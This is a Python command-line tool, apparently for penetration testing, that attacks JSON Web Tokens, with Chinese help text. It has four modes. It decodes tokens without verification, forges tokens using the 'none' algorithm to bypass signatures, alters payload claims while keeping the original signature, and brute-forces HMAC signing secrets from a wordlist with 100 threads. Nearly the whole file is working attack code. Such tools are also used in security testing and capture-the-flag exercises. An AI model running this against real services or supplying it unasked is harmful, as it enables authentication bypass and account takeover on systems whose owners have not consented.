import jwt
import argparse
import os
import base64
import sys
import threading
import queue
import json

class jwtbrute(threading.Thread):
    def __init__(self, jwtstr, que):
        threading.Thread.__init__(self)
        self._queue = que
        self._jwtstr = jwtstr

    def run(self):
        while not self._queue.empty():
            que = self._queue.get(timeout=0.5)
            try:
                alg = json.loads(base64.b64decode(self._jwtstr.split('.')[0]))['alg']
                jwt.decode(self._jwtstr, que, algorithms=[alg])
                print('found token -------------->: '+que)
                os._exit(0)
            except jwt.exceptions.InvalidTokenError:
                print('invalid token: '+que)



def decipher_runc(jwtstr):
    header = jwtstr.split('.')[0]
    if (len(header) % 4) != 0:
        header = header + '='*(4 - (len(header) % 4))
    payload = jwt.decode(jwtstr, verify=False)
    print("\n\nheader: {}\n\npayload: {}".format(base64.b64decode(header), payload))
    

def algnone_runc(jwtstr):

    payload = jwt.decode(jwtstr, verify=False)
    print('\nJWT-1: '+str(jwt.encode(payload,algorithm='none',key=''), 'utf-8'))
    print('\n')
    header = jwtstr.split('.')[0]
    if (len(header) % 4) != 0:
        header = header + '='*(4 - (len(header) % 4))
    header = json.loads(str(base64.b64decode(header), 'utf-8'))
    header['alg'] = 'None'
    header = str(base64.b64encode(json.dumps(header).encode()), 'utf-8').replace('=', '')
    print('JWT-2: '+header+'.'+jwtstr.split('.')[1])

    
def spoofjwk_runc(jwtstr, spoofjwk_jwt):
    payload = jwt.decode(jwtstr, verify=False)
    for spoof in spoofjwk_jwt:
        payload[spoof.split(':')[0]] = spoof.split(':')[1]
    payload = base64.b64encode(json.dumps(payload).encode())
    print('\nJWT: '+jwtstr.split('.')[0]+'.'+str(payload, 'utf-8').replace('=', '')+'.'+jwtstr.split('.')[2])


def brute_dict(jwtstr, dict_jwt):
    header = jwtstr.split('.')[0]
    if (len(header) % 4) != 0:
        header = header + '='*(4 - (len(header) % 4))
    alg = json.loads(base64.b64decode(header))['alg']
    if not alg.startswith('HS') or alg.startswith('none'):
        print('\n未采用对称加密算法，或者未设定加密算法')
        return False
    threads = []
    que = queue.Queue()

    with open(dict_jwt,'r') as f:
        for i in f.readlines():
            que.put(i.strip())

    for i in range(100):
        threads.append(jwtbrute(jwtstr, que))

    for i in threads:
        i.start()

    for i in threads:
        i.join()


def get_parser():
    parser = argparse.ArgumentParser(epilog="User: python3 jwt_cli.py jwt_string -D", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("jwts", type=str,
                        help="JWT字符串")
    parser.add_argument("-D", "--decipher", action="store_true",
                        help="解密JWT中的HEADER和PAYLOAD，无参数传输")
    parser.add_argument("-A", "--algnone", action="store_true",
                        help="禁用加密算法，重新生成JWT字段，无参数传输")
    parser.add_argument("-s", "--spoofjwk", action="store", nargs='*',
                        help="修改PAYLOAD字段添加进原来的JWT字段，需要显示的说明修改的key:value，允许多个参数修改")
    parser.add_argument("-d", "--dict", action="store",
                        help="指定密钥字典，爆破JWT密钥")


    args = parser.parse_args()
    jwtstr = args.jwts
    spoofjwk_jwt = ''
    dict_jwt = ''
    if args.decipher:
        decipher_runc(jwtstr)
        sys.exit(0)
    if args.algnone:
        algnone_runc(jwtstr)
        sys.exit(0)
    if args.spoofjwk:
        spoofjwk_jwt = args.spoofjwk
        spoofjwk_runc(jwtstr, spoofjwk_jwt)
        sys.exit(0)
    if args.dict:
        dict_jwt = args.dict
        brute_dict(jwtstr, dict_jwt)
        sys.exit(0)



if __name__ == '__main__':
    get_parser()